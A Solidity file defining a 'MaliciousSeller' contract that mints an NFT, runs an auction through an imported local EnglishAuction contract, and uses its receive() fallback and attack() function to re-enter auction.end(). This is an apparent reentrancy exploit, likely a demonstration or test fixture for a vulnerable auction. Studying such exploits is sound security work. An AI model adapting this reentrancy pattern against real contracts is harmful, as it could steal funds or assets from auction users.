// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./EnglishAuction.sol";

contract MaliciousSeller {
    EnglishAuction public auction;
    MyNFT public nft;
    address public owner;
    uint256 public tokenId;

    constructor(address _nft, uint256 _tokenId) {
        nft = MyNFT(_nft);
        owner = msg.sender;
        tokenId = _tokenId;
    }

    function deployAuction(uint256 _startingBid) external {
        require(msg.sender == owner, "Only owner can deploy the auction");
        auction = new EnglishAuction(address(nft), tokenId, _startingBid);
    }

    function mintSeller() external {
        require(msg.sender == owner, "Only owner can mint the NFT");
        nft.mint(address(this), tokenId);
    }

    function approveAuction() external {
        require(msg.sender == owner, "Only owner can approve the auction");
        nft.approve(address(auction), tokenId);
    }

    function bidAuction() external payable {
        auction.bid{value: msg.value}();
    }

    function startAuction() external {
        auction.start();
    }

    function attack() external {
        auction.end();
    }

    receive() external payable {
        if (address(auction).balance >= auction.highestBid()) {
            auction.end();
            nft.transferFrom(address(this), address(auction), tokenId);
        }
    }

    function deposit() external payable {}
}
